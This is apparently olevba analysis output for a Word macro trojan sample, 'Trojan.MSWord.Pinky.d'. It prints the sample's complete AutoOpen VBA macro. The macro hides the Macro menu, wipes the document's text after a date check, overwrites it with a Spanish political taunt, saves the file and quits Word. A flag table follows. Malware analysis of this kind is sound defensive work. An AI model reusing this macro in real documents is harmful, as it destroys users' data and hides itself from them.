olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.Pinky.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.Pinky.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Trojan.MSWord.Pinky.d - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub AutoOpen()
Attribute AutoOpen.VB_Description = "se abre!!!"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.AutoOpen"
'
' AutoOpen Macro
' se abre!!!
'
CommandBars("Tools").Controls("Macro").Visible = False

If WordBasic.Month(WordBasic.Now) > 3 And WordBasic.Day(WordBasic.Now) > 5 Then
    Selection.WholeStory
    Selection.Delete Unit:=wdCharacter, Count:=1
    ActiveDocument.Save
    Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
    Selection.Font.ColorIndex = wdRed
    Selection.Font.Name = "Times New Roman"
    Selection.Font.Size = 48
    Selection.TypeText Text:="e-México..."
    Selection.TypeParagraph
    Selection.Font.Name = "Arial"
    Selection.Font.Size = 36
    Selection.Font.ColorIndex = wdAuto
    Selection.TypeText Text:="...un paraíso para los hacker's!!!!"
    Selection.TypeParagraph
    Selection.TypeText Text:="Pinche FOX Pendejo!!!"
    Selection.TypeParagraph
    ActiveDocument.Save
    Application.Quit
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

